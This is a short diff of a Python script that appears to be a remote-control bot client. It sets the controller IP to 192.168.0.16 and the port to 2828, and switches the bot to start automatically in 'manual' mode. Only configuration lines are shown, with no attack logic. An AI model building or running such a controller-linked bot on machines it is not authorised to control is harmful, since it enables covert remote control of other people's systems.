@@ -4,11 +4,11 @@ import modules, urllib.request, time, socket, subprocess, os
 
 
 botname = ''			# Put name of bot here
-host = '127.0.0.1'		# Put controller IP here
-port = 8080				# Put controller listening port here
+host = '192.168.0.16'		# Put controller IP here
+port = 2828				# Put controller listening port here
 connections = {
 	'source':'',		# Put URL for update here. Leave blank for manual only.
-	'instruction':''	# Put url for currently active device here. if source is set to 'manual', the bot will automatially start.
+	'instruction':'manual'	# Put url for currently active device here. if source is set to 'manual', the bot will automatially start.
 }
 
 if connections['instruction'] == 'manual':
